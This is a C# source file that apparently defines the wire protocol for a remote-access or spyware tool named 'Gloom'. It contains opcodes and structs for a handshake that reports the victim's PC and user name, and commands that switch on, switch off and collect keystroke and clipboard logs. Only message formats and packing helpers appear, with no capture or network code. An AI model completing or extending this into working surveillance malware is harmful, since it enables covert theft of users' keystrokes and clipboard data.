using System.Runtime.InteropServices;

namespace Gloom;

/// <summary>
/// Payload opcode definitions.
/// </summary>
public static class OpCodes
{
	public readonly static Guid HelloWorld = Guid.Parse("6694af3e-f1c6-4f05-a1ad-7fa6f12d2117");
	public readonly static Guid ClientHandshake = Guid.Parse("033f8e43-ddee-4536-936e-71f94c599033");
	public readonly static Guid ServerHandshake = Guid.Parse("77b710eb-6507-4034-9ac6-c17d50e46b26");
	public readonly static Guid Test = Guid.Parse("09a3e64a-f87a-48d6-9760-fd2d61bd31e5");
	public readonly static Guid KeyLogRequest = Guid.Parse("ccbf3f39-219b-4596-9d4c-a7eae27924be");
	public readonly static Guid KeyLogResponse = Guid.Parse("59b1dbab-b6fe-4a4a-b597-c95e2242d622");
	public readonly static Guid ClipboardRequest = Guid.Parse("f9ddb84b-84b1-4d3f-9a43-51e8b1d386f8");
	public readonly static Guid ClipboardResponse = Guid.Parse("d4b0571b-7f54-4b25-8b7a-ee9e5d690fe8");
}

/// <summary>
/// Payload packer/unpacker.
/// </summary>
public static class PayloadEncoderExtension
{
	public static byte[] NewPayload(this Guid opGuid, byte[] data)
	{
		var payload = new byte[data.Length + 24]; // 8(Length) + 16(GUID) + n(Data)
		var lengthBytes = BitConverter.GetBytes(data.LongLength);
		Buffer.BlockCopy(lengthBytes, 0, payload, 0, 8);
		opGuid.TryWriteBytes(payload.AsSpan()[8..]);
		Buffer.BlockCopy(data, 0, payload, 24, data.Length);
		return payload;
	}

	public static long GetContentLength(this byte[] payload) => BitConverter.ToInt64(payload.AsSpan()[..8]);

	public static Guid GetGuid(this byte[] payload) => new(payload[8..24]);

	public static byte[] GetData(this byte[] payload) => payload[24..((int)GetContentLength(payload) + 24)];
}

/// <summary>
/// Simple .NET struct encoder/decoder.
/// https://kdsoft-zeros.tistory.com/25
/// </summary>
public static class StructConvert
{
	public static byte[] Struct2Bytes(object obj)
	{
		var sz = Marshal.SizeOf(obj);
		var arr = new byte[sz];
		IntPtr ptr = Marshal.AllocHGlobal(sz);
		Marshal.StructureToPtr(obj, ptr, false);
		Marshal.Copy(ptr, arr, 0, sz);
		Marshal.FreeHGlobal(ptr);
		return arr;
	}

	public static T Byte2Struct<T>(byte[] buffer) where T : struct
	{
		int sz = Marshal.SizeOf(typeof(T));
		if (sz > buffer.Length)
			throw new ArgumentException("Type size larger than buffer size: type_size=" + sz + ", buffer_size=" + buffer.Length);
		IntPtr ptr = Marshal.AllocHGlobal(sz);
		Marshal.Copy(buffer, 0, ptr, sz);
		var obj = (T)Marshal.PtrToStructure(ptr, typeof(T))!;
		Marshal.FreeHGlobal(ptr);
		return obj;
	}
}

public static class HandshakeData
{
	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClientHandshake
	{
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string PcName;
		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string UserName;
		public long PublicKeyLength;
		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 1024)]
		public byte[] PublicKeySpec;
	}
}

public static class KeyLoggerData
{
	public static readonly Guid EnableKeyLogger = Guid.Parse("f1b2ee13-fc29-401f-b6b7-808847c843a4");
	public static readonly Guid DisableKeyLogger = Guid.Parse("530743b1-b1ce-4d15-8652-d476d4868011");
	public static readonly Guid RequestKeyLog = Guid.Parse("7203c3cd-2936-4324-b622-16d921d2b2a2");

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLoggerRequest
	{
		public Guid RequestType;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLoggerStateResponse
	{
		public bool Enabled;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct KeyLogResponse
	{
		public Guid RequestType;
		public byte[] CompressedKeyLog;
	}
}

public static class ClipboardLoggerData
{
	public static readonly Guid EnableClipboardLogger = Guid.Parse("dee4dca8-c412-4f6e-ab48-dcf2267657a9");
	public static readonly Guid DisableClipboardLogger = Guid.Parse("cd3f01a9-c1cb-4497-8035-844dd3fca93f");
	public static readonly Guid RequestClipboardLog = Guid.Parse("ceb53e83-f20c-49a2-a5aa-1b187b157ac3");


	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerRequest
	{
		public Guid RequestType;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLoggerStateResponse
	{
		public bool Enabled;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct ClipboardLogResponse
	{
		public long TotalKeyStrokes;
		public byte[] CompressedKeyLog;
	}
}